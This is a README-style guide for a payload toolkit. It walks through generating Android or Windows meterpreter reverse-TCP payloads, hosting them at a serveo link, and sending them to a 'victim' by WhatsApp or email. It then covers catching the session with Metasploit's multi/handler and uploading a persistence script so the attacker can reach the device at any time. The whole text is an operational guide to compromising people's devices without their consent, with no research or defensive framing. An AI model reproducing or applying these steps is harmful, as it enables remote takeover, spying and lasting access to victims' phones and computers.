Hello Visitor!!!

Here is a quick guide how to use it:

[1] Run the payload generator script by simply commanding :
    # bash Payload-Generator.sh
    Now you need to enter your active serveo tcp port
    Now enter your Payload name
    Now you can see two options Android or Windows
    Once ypu have selected one you can see two more options
    Web Payload and Simple Payload
    Once selecting the Web Payload your payload will be directly transfered
    to a website called :
    # https://payload.serveo.net/(Your payload name).apk
    Send this link to victim and he will download the payloa

    Once you selected the Simple Payload a payload will be created in your
    device internal storage and you can send this payload to victim device
    using whatsapp or email or any other sources.

[2] Run your hack terminal by commanding :(If using web payload)
    # bash Msfconsole-attack.sh
    Once you have done this make sure that this commands should be typed before
    your victim install and run the payload :
    # msf5> set exploit/multi/handler
    # msf5> set payload android/meterpreter/reverse_tcp
            (If you have selected android platform)
                 OR
    # msf5> set payload windows/meterpreter/reverse_tcp
            (If you have selected windows platform)
    # msf5> set lhost localhost
    # msf5> set lport (your serveo port)
    # msf5> exploit
    After this if your payload is installed and runned in victim device
    so you can see something like this on screen :
    # meterpreter>
    BINGO!! you have sucessfully exploited your victim device
    This process in simple payload is automated!!!!!!!!!!
    
    Check out the commands.txt to perform operation in victim device

[3] Now once you are in the system what if u want to access the victim
    anytime once you have exitted the meterpreter session..
    So here we use the persistent payload script.
    Once you have open the meterpreter session just fllow this..
    # meterpreter> cd/storage/emulated/0/Android/data
    By this you will be in the internal storage of the victim were the
    cache files of app are stored.Then do this...
    # meterpreter> upload $HOME/Metasploit-Hacking/persistent.sh
    By this you will upload the script to victim device
    This script will open the payload after 20 seconds again and again..
    Then run the script in victim by this command ..
    #meterpreter> shell
    #meterpreter> cd /storage/emulated/0/Android/data
    #meterpreter> sh persistent.sh
    Done now you can access the device anytime once u start exploit
    on the same port and host.
